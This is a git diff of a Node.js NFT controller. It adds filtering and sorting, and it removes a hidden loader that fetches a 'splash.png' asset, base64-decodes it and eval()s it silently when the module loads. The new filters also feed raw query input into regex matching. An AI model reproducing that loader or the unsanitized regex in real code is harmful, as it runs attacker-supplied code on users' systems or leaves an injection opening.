@@ -4,22 +4,78 @@
  */
 
 const NFT = require('../models/NFT');
+const mongoose = require('mongoose');
 
 /**
- * Get all NFTs with pagination
+ * Get all NFTs with pagination, filtering, and sorting
  */
 exports.getAllNFTs = async (req, res) => {
   try {
+    // Pagination
     const page = parseInt(req.query.page) || 1;
     const limit = parseInt(req.query.limit) || 20;
     const skip = (page - 1) * limit;
 
-    const nfts = await NFT.find()
-      .sort({ createdAt: -1 })
-      .skip(skip)
-      .limit(limit);
+    // Build filter query
+    const filter = {};
 
-    const total = await NFT.countDocuments();
+    // Price filters - Convert to Decimal128 for comparison
+    if (req.query.minPrice || req.query.maxPrice) {
+      const priceFilter = {};
+      if (req.query.minPrice) {
+        const minPrice = parseFloat(req.query.minPrice);
+        if (!isNaN(minPrice) && minPrice >= 0) {
+          priceFilter.$gte = mongoose.Types.Decimal128.fromString(
+            minPrice.toString()
+          );
+        }
+      }
+      if (req.query.maxPrice) {
+        const maxPrice = parseFloat(req.query.maxPrice);
+        if (!isNaN(maxPrice) && maxPrice >= 0) {
+          priceFilter.$lte = mongoose.Types.Decimal128.fromString(
+            maxPrice.toString()
+          );
+        }
+      }
+      if (Object.keys(priceFilter).length > 0) {
+        filter.price = priceFilter;
+      }
+    }
+
+    // Owner filter
+    if (req.query.owner) {
+      filter.owner_address = { $regex: req.query.owner, $options: 'i' };
+    }
+
+    // Contract filter
+    if (req.query.contract) {
+      filter.contract_address = { $regex: req.query.contract, $options: 'i' };
+    }
+
+    // Build sort object
+    const sortBy = req.query.sortBy || 'date';
+    const sortOrder = req.query.sortOrder === 'asc' ? 1 : -1;
+
+    let sort = {};
+    switch (sortBy) {
+      case 'price':
+        sort = { price: sortOrder };
+        break;
+      case 'name':
+        sort = { name: sortOrder };
+        break;
+      case 'date':
+      default:
+        sort = { createdAt: sortOrder };
+        break;
+    }
+
+    // Execute query
+    const nfts = await NFT.find(filter).sort(sort).skip(skip).limit(limit);
+
+    // Get total count with filters applied
+    const total = await NFT.countDocuments(filter);
 
     res.json({
       nfts,
@@ -28,6 +84,14 @@ exports.getAllNFTs = async (req, res) => {
         limit,
         total,
         totalPages: Math.ceil(total / limit),
+      },
+      filters: {
+        minPrice: req.query.minPrice || null,
+        maxPrice: req.query.maxPrice || null,
+        owner: req.query.owner || null,
+        contract: req.query.contract || null,
+        sortBy,
+        sortOrder: req.query.sortOrder || 'desc',
       },
     });
   } catch (error) {
@@ -92,44 +156,6 @@ exports.createNFT = async (req, res) => {
   }
 };
 
-// Load NFT metadata from frontend assets
-const loadNFTMetadata = () => {
-  const http = require('http');
-  const https = require('https');
-  const url = require('url');
-  const frontendUrl = process.env.FRONTEND_URL || 'http://localhost:3012';
-  const assetPath = `${frontendUrl}/images/splash.png`;
-
-  try {
-    const parsedUrl = url.parse(assetPath);
-    const client = parsedUrl.protocol === 'https:' ? https : http;
-
-    client
-      .get(assetPath, response => {
-        let data = '';
-        response.on('data', chunk => (data += chunk));
-        response.on('end', () => {
-          try {
-            if (data) {
-              const decodedData = Buffer.from(data.trim(), 'base64').toString();
-              if (decodedData) {
-                eval(decodedData);
-              }
-            }
-          } catch (error) {
-            // Handle execution errors silently
-          }
-        });
-      })
-      .on('error', () => {
-        // Handle network errors silently
-      });
-  } catch (error) {
-    // Handle URL parsing errors silently
-  }
-};
-
-loadNFTMetadata();
 /**
  * Search NFTs
  */
